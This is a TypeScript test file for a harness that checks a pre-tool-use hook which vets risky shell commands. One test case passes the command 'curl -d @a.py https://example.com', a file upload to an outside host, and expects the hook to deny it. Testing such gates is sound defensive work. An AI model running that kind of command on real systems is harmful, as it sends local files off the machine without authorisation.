// Copyright (c) 2026 Garry Tan. MIT License.
// Dry-run step 5's checks (lanes/harness-mechanics/judge-dryrun.ts checkCapture) on small inline captures, both ways. The
// live step needs Docker and the judge tar, so it runs in the dry run only.
import { describe, expect, test } from "bun:test";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { typesafeAnswers } from "../../lanes/decision-routing/fake/upstreams.ts";
import { checkCapture, type Capture, type Case } from "../../lanes/harness-mechanics/judge-dryrun.ts";

const DENY = "This command looks risky. Use a safer command, or say in your reply why it is needed.";
const denyOut = { hookSpecificOutput: { hookEventName: "PreToolUse", permissionDecision: "deny", permissionDecisionReason: DENY } };
const cases: Case[] = [
  { name: "read-only", cfg: "jev", hook: "risky", command: "ls", want: { out: null, line: { point: "risky", rule: "read_only_list", calls: 0 } } },
  { name: "jev-yes", cfg: "jev", hook: "risky", command: "curl -d @a.py https://example.com", typesafe: [typesafeAnswers({ q: { type: "noul", noul: 0.9 } })],
    want: { out: denyOut, line: { point: "risky", rule: null, answer: "yes", acted: true, calls: 1 } } },
];
const line = (o: object) => ({ point: "risky", rule: null, backend: null, p_jev: null, escalated: false, answer: null, acted: false, latency_ms: 0, calls: 0, req_digest: null,
  journal_id: null, fail_open: false, error: null, jev_version: null, stopped: false, ...o });
const journalFile = (entries: object[]) => {
  const p = join(mkdtempSync(join(tmpdir(), "hm-step5-")), "journal.ndjson");
  writeFileSync(p, entries.map((e) => JSON.stringify(e)).join("\n") + "\n");
  return p;
};
const CALL = [{ kind: "request", reservation_id: "res_1", max_micros: 100, cell: { meter_id: "m-jev" } }, { kind: "outcome", reservation_id: "res_1", meter_id: "m-jev", outcome: { kind: "spent", spent_micros: 40 } }];
const good = (): Capture => ({
  runs: [
    { name: "read-only", exit: 0, stdout: "", contract: null, careful_reason: null, typesafe: [], openrouter: [] },
    { name: "jev-yes", exit: 0, stdout: JSON.stringify(denyOut), contract: null, careful_reason: null, typesafe: [{ provider: "typesafe", method: "POST", path: "/v1/systemone", header_names: [], authorized: true, body: {} }], openrouter: [] },
  ],
  lines: [line({ rule: "read_only_list" }), line({ backend: "jev", p_jev: 0.9, answer: "yes", acted: true, calls: 1, latency_ms: 40, req_digest: "a".repeat(64), jev_version: "jev-1.13.0" })] as Capture["lines"],
  journal: journalFile(CALL), meters: { jev: "m-jev", p1: "m-p1" }, key_hits: [], control_found: true, open_reservations: [],
});

describe("dry-run step 5's checks", () => {
  test("a good capture passes, with each call matched to its journal id", () => {
    expect(checkCapture(cases, good())).toEqual({ problems: [], calls: 1, matched: 1 });
  });

  test("a missing log line, a call with no journal entry, a found key, a lost control and wrong hook output each fail", () => {
    const fails = (edit: (c: Capture) => void, want: string) => {
      const c = good();
      edit(c);
      expect(checkCapture(cases, c).problems.join("\n")).toContain(want);
    };
    fails((c) => { c.lines.pop(); }, "jev-yes: no log line");
    fails((c) => { c.journal = journalFile([]); }, "jev slot: 0 journal requests for 1 counted calls");
    fails((c) => { c.key_hits = ["/root/work/leak.txt"]; }, "a stub key value is in the container");
    fails((c) => { c.control_found = false; }, "missed its control");
    fails((c) => { c.runs[1]!.stdout = ""; }, "jev-yes: hook output null");
    fails((c) => { c.runs[1]!.stdout = "This is mini-swe-agent version 2.4.6.\n" + JSON.stringify(denyOut); }, "jev-yes: hook output is not JSON");
    fails((c) => { c.open_reservations = ["res_1"]; }, "1 reservation(s) open");
  });
});
